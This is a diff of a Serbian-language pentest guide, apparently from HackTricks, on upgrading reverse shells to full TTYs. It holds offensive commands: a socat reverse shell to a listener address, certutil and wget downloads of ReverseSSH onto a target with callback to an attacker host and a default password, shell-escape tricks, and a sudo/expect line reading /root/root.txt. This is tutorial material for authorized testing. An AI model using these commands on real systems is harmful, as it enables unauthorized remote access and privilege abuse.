@@ -1,26 +1,31 @@
 # Puni TTY-ji
 
-{{#include ../../banners/hacktricks-training.md}}
-
 ## Puni TTY
 
-Imajte na umu da shell koji postavite u promenljivoj `SHELL` **mora biti** **naveden unutar** _**/etc/shells**_ ili će se prikazati poruka `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Takođe, imajte na umu da sledeći snippets rade samo u bash-u. Ako ste u zsh-u, pre preuzimanja shell-a pređite na bash pokretanjem komande `bash`.
+`/etc/shells` navodi važeće putanje do login shell-ova i neki programi ga koriste; nije univerzalni preduslov za dodelu PTY-ja.<sup>[[3]](#references)[[4]](#references)</sup> Ako program kao što je `pkexec` odbije `SHELL` uz poruku `The value for the SHELL variable was not found in the /etc/shells file`, proverite da li se tačna putanja do shell-a (na primer, `/bin/bash`) pojavljuje u `/etc/shells`.<sup>[[10]](#references)</sup> Sekvenca za oporavak `CTRL+Z`/`fg` u nastavku koristi Bash kontrolu poslova; ako trenutni shell nije Bash, pokrenite Bash pre korišćenja te sekvence.<sup>[[7]](#references)</sup>
 
 #### Python
+
+Python-ov `pty.spawn` pokreće program povezan sa standardnim ulazom, izlazom i greškama trenutnog procesa, čime Bash dobija pseudo-terminal u ovoj sesiji.<sup>[[4]](#references)</sup>
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-
-(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
 > [!TIP]
-> Možete dobiti **broj** **redova** i **kolona** izvršavanjem **`stty -a`**
+> Možete dobiti **broj** **redova** i **kolona** pokretanjem komande **`stty -a`**; `-a` ispisuje sva trenutna podešavanja terminala. Izlaz komande zavisi od terminala, zato koristite vrednosti koje prijavi trenutna sesija.<sup>[[11]](#references)</sup>
 
 #### script
+
+Alat `script` beleži sesiju terminala; ovde `/dev/null` odbacuje typescript, `-q` potiskuje poruke o pokretanju i završetku, a `-c` pokreće Bash umesto podrazumevanog shell-a.<sup>[[5]](#references)</sup>
 ```bash
 script /dev/null -qc /bin/bash #/dev/null is to not store anything
+```
+Nakon bilo koje PTY-spawn metode, suspendujte Netcat sesiju i vratite je sa lokalnim raw mode-om, zatim podesite remote terminal environment i dimenzije:
+```bash
 (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
 #### socat
+
+Listener koristi trenutni terminal u raw režimu sa onemogućenim lokalnim echo-om i prihvata TCP connections na portu 4444. Komanda na victim strani alocira pty, spaja stderr, kreira session, prosleđuje SIGINT i primenjuje sane terminal settings; dodajte `ctty` ako child procesu treba controlling terminal.<sup>[[6]](#references)</sup>
 ```bash
 #Listener:
 socat file:`tty`,raw,echo=0 tcp-listen:4444
@@ -41,36 +46,37 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 - IRB: `exec "/bin/sh"`
 - vi: `:!bash`
 - vi: `:set shell=/bin/bash:shell`
-- nmap: `!sh`
+- nmap (stare verzije sa opcijom `--interactive`): `!sh`
+
+Nmap escape zavisi od verzije: Nmap je u kasnijim izdanjima uklonio režim `--interactive`, tako da se `!sh` odnosi samo na stare verzije.<sup>[[13]](#references)</sup>
 
 ## ReverseSSH
 
-Praktičan način za **interaktivni pristup shell-u**, kao i za **prenos fajlova** i **prosleđivanje portova**, jeste postavljanje statički linkovanog ssh servera [ReverseSSH](https://github.com/Fahrj/reverse-ssh) na ciljnom sistemu.<sup>[[1]](#references)</sup>
+Praktičan način za **interaktivni pristup shell-u**, kao i za **prenos datoteka** i **prosleđivanje portova**, jeste postavljanje statički linkovanog SSH servera [ReverseSSH](https://github.com/Fahrj/reverse-ssh) na target.<sup>[[1]](#references)</sup>
 
-U nastavku je primer za `x86` sa UPX-kompresovanim binarnim fajlovima. Za druge binarne fajlove pogledajte [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+U nastavku je primer za `x86` sa UPX-kompresovanim binarnim fajlom koji je objavio projekat. Za druge arhitekture ili release artefakte koristite [stranicu sa izdanjima](https://github.com/Fahrj/reverse-ssh/releases/latest/) kao navigaciju.<sup>[[1]](#references)</sup>
 
-1. Lokalno se pripremite za prihvatanje zahteva za ssh port forwarding:
+1. Pripremite lokalni host da prihvati dolaznu SSH konekciju. U listener režimu, `-l` uključuje listener, a `-p 4444` bira port na kojem prihvata konekciju targeta.<sup>[[1]](#references)</sup>
 ```bash
 # Drop it via your preferred way, e.g.
 wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
 
 /dev/shm/reverse-ssh -v -l -p 4444
 ```
-- (2a) Linux meta:
+- (2a) Linux target. Prenesite isti `upx_reverse-sshx86` artefakt u `/dev/shm/reverse-ssh` i učinite ga izvršnim. Parametar `-p 4444` na targetu bira port za osluškivanje naveden iznad, a `kali@10.0.0.2` navodi nalog i host koji se koriste za povratno povezivanje.<sup>[[1]](#references)</sup>
 ```bash
-# Drop it via your preferred way, e.g.
-wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
-
 /dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
 ```
-- (2b) Windows 10 cilj (za starije verzije, pogledajte [project readme](https://github.com/Fahrj/reverse-ssh#features)):
+- (2b) Windows target. Full interactive PowerShell zahteva Windows 10 build 17763; pogledajte [project README](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
 ```bash
 # Drop it via your preferred way, e.g.
 certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe
 
 reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
-- Ako je zahtev za prosleđivanje porta ReverseSSH bio uspešan, sada bi trebalo da možete da se prijavite koristeći podrazumevanu lozinku `letmeinbrudipls` u kontekstu korisnika koji pokreće `reverse-ssh(.exe)`:
+Windows primer koristi `certutil` sa `-f -urlcache`; Microsoft navodi da `-f` forsira preuzimanje sa URL-a i napominje da dostupni parametri zavise od verzije, zato proverite `certutil -?` ako ovaj oblik nije dostupan.<sup>[[12]](#references)</sup>
+
+- Nakon što reverse konekcija uspe, ReverseSSH reverse-mode listener se podrazumevano vezuje za port `8888` (ili vrednost prosleđenu pomoću `-b`), a dolazne konekcije prihvataju bilo koje korisničko ime sa podrazumevanom lozinkom `letmeinbrudipls`. Remote shell se izvršava sa privilegijama naloga koji je pokrenuo `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -80,19 +86,29 @@ sftp -P 8888 127.0.0.1
 ```
 ## Penelope
 
-[Penelope](https://github.com/brightio/penelope) automatski nadograđuje Linux reverse shells na TTY, upravlja veličinom terminala, beleži sve i još mnogo toga. Takođe pruža readline podršku za Windows shells.<sup>[[2]](#references)</sup>
+[Penelope](https://github.com/brightio/penelope) automatski nadograđuje Unix-like reverse shells na PTY, menja veličinu Unix-like terminala i beleži interakcije sa shell-om; za Windows shells pruža readline, ali ne i promenu veličine terminala u realnom vremenu.<sup>[[2]](#references)</sup>
 
-![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
+Pokrenite `penelope` da po podrazumevanim vrednostima sluša na `0.0.0.0:4444`; dolazni Unix-like shells se zatim mogu automatski nadograditi i beležiti.<sup>[[2]](#references)</sup>
 
 ## Bez TTY
 
-Ako iz nekog razloga ne možete da dobijete puni TTY, **i dalje možete da komunicirate sa programima** koji očekuju korisnički unos. U sledećem primeru, lozinka se prosleđuje komandi `sudo` kako bi pročitala datoteku:
+Ako iz nekog razloga ne možete da dobijete pun TTY, **i dalje možete da komunicirate sa programima** koji očekuju korisnički unos. U sledećem primeru, Expect pokreće `sudo`, čeka njegov zahtev za lozinku, šalje lozinku i vraća kontrolu pomoću `interact`; `sudo -S` čita lozinku sa standardnog ulaza. Koristite ovo samo u autorizovanoj laboratoriji i izbegavajte unošenje stvarnih akreditiva u shell history ili source files.<sup>[[8]](#references)[[9]](#references)</sup>
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
-## Reference
+## References
 
-- [1] [ReverseSSH - Statically-linked ssh server sa reverse shell funkcionalnošću za CTF-ove i slično](https://github.com/Fahrj/reverse-ssh)
-- [2] [Penelope - Shell handler koji automatizuje nekoliko stvari kako bi olakšao život](https://github.com/brightio/penelope)
-
+- [1] [ReverseSSH - Statically-linked ssh server sa funkcionalnošću reverse shell-a za CTF-ove i slično](https://github.com/Fahrj/reverse-ssh)
+- [2] [Penelope - Shell handler koji automatizuje nekoliko stvari radi lakšeg rada](https://github.com/brightio/penelope)
+- [3] [shells(5) — Linux stranica priručnika](https://man7.org/linux/man-pages/man5/shells.5.html)
+- [4] [Python `pty` — Python dokumentacija](https://docs.python.org/3/library/pty.html)
+- [5] [script(1) — Linux stranica priručnika](https://man7.org/linux/man-pages/man1/script.1.html)
+- [6] [socat(1) — Linux stranica priručnika](https://man7.org/linux/man-pages/man1/socat.1.html)
+- [7] [Bash Reference Manual — Kontrola poslova](https://www.gnu.org/s/bash/manual/bash.html)
+- [8] [sudo(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/sudo.8.html)
+- [9] [expect(1) — Linux stranica priručnika](https://man7.org/linux/man-pages/man1/expect.1.html)
+- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
+- [11] [stty(1) — Linux stranica priručnika](https://man7.org/linux/man-pages/man1/stty.1.html)
+- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
+- [13] [Nmap Change Log](https://nmap.org/changelog.html)
 {{#include ../../banners/hacktricks-training.md}}
